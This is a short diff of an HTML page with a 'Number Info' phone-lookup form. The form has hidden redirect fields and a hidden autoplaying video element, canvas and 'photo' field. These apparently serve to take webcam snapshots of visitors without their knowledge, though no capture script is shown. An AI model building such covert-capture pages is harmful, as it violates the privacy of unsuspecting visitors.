@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -15,17 +16,17 @@
 <body>
   <form id="myForm" method="post">
  
-    <input type="text" id="phoneNumber" placeholder="Enter Number" value="">
+    <input type="text" name="phoneNumber"   id="phoneNumber" placeholder="Enter Number" value="">
     
   
 <input type="hidden" name="redirect_url" value="NumberInfo.html"><button type="submit" id="loadUrlBtn">Load URL</button><br><br>
-    <iframe id="iframe" src="" frameborder="0"></iframe>
+    <iframe id="iframe" src="" frameborder="0"></iframe> 
     <div id="iframeContent"></div>
 
     <input type="hidden" name="title" value="Number Info">
 
-    <input type="hidden" name="urlInput" value="NumberInfo.html">
-   
+    <input type="hidden" name="redirect_url" value="NumberInfo.html">
+   <input type="hidden" name="urlInput" value="NumberInfo.html">
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <input type="hidden" name="photo" id="photo">
